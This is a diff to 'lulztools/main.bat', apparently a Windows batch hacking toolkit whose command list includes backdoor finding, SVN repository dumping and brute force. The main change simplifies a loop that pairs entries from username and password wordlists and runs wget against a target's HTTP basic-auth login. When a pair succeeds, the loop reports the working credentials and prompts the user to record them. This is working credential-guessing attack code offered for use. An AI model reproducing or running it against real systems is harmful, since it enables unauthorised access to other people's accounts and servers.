@@ -146,7 +146,7 @@ if %Day% == 13 (
 		echo   |  \__/\__/  |\_/  \__/\__/  \_/|  : |_/\_| ;  |  |    \__/\__/    |
 		echo   \            /  \            /   \ '.\    /.' / .-\                >/-.
 		echo   /'._  --  _.'\  /'._  --  _.'\   /'. `'--'` .'\/   '._-.__--__.-_.'
-		echo \/_   `""""`   _\/_   `""""`   _\ /_  `-./\.-'  _\'.    `""""""""`'`\
+		echo \/_   `....`   _\/_   `....`   _\ /_  `-./\.-'  _\'.    `........`'`\
 		echo (__/    '|    \ _)_|           |_)_/            \__)|        '        
 		echo   |_____'|_____|   \__________/|;                  `_________'________`;-'
 		echo   s'----------'    '----------'   '--------------'`--------------------`
@@ -170,6 +170,7 @@ if %1 == backdoor goto backdoor_find
 if %1 == clear goto clear
 if %1 == system goto system_main
 if %1 == brute_force goto brute-force
+if %1 == lulzdb goto lulzdb
 
 :svn
 if %2 == repodump_create (
@@ -490,20 +491,18 @@ if %TYPE% == wget (
 	FOR /F "skip=1 eol=> tokens=1 delims=" %%a IN (%LIST1%) DO (
 		FOR /F "skip=1 eol=> tokens=1 delims=" %%b IN (%LIST2%) DO (
 			echo lulztools/main.bat:#h_brute-force> Trying to log in with %%a:%%b
-			if %TYPE% == wget (
-				echo lulztools/main.bat:#h_brute-force> Trying to log in with %%a:%%b
-				wget --http-user=%%a --http-passwd=%%b --quiet %INFO%
-				if %ERRORLEVEL% == 0 (
-					echo lulztools/main.bat:#h_brute-force> Got username and password from %INFO%
-					echo lulztools/main.bat:#h_brute-force> Used: %%a:%%b
-					echo lulztools/main.bat:#h_brute-force> It is best to copy down the login data now
-					pause >nul
-					goto end
-				)
+			wget --http-user=%%a --http-passwd=%%b --quiet %INFO%
+			if %ERRORLEVEL% == 0 (
+				echo lulztools/main.bat:#h_brute-force> Got username and password from %INFO%
+				echo lulztools/main.bat:#h_brute-force> Used: %%a:%%b
+				echo lulztools/main.bat:#h_brute-force> It is best to copy down the login data now
+				pause >nul
+				goto end
 			)
 		)
 	)
 )
+
 
 if %TYPE% == aes (
 	FOR /F "skip=1 eol=> tokens=1 delims" %%a in (%LIST1%) DO (
@@ -518,12 +517,10 @@ if %TYPE% == aes (
 	)
 )
 
-if %TYPE% == curl_send (
-	echo lulztools/main.bat:#h_brute-force> I am still working on this function :)
-	goto end
-)
-
 echo lulztools/main.bat:#h_brute-force> Command not found
+goto end
+
+:
 
 :end
 echo lulztools/main.bat:end> Press any button to exit
